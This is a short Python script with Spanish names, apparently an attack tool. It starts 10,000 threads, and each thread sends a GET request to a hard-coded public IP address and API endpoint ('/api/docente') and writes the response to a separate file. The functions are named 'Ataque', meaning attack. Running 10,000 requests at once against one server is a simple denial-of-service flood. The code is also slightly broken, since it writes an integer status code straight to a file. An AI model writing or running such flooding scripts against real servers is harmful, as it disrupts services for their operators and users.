import requests
import threading


def file_manipulation(name, mode):
    try:
        file = open(name, mode)
        return file
    except OSError as err:
        print("Error: {0}".format(err))
    return


def Ataque(hilo=0, url="http://104.215.96.155:3000/api/docente"):
    response = requests.get(url)    
    f = file_manipulation("Ataque"+str(hilo)+".txt", 'w')    
    f.write(str(response))
    if response.status_code == 200:
        f.write(str(response.json()))        
    else:
        f.write(response.status_code)        
    
    
    f.close()


n = 10000
Lista_hilos = []
for i in range(n):
    Lista_hilos.append(threading.Thread(target=Ataque, args=(i,)))
for i in range(n):
    Lista_hilos[i].start()
for i in range(n):
    Lista_hilos[i].join()


Ataque()
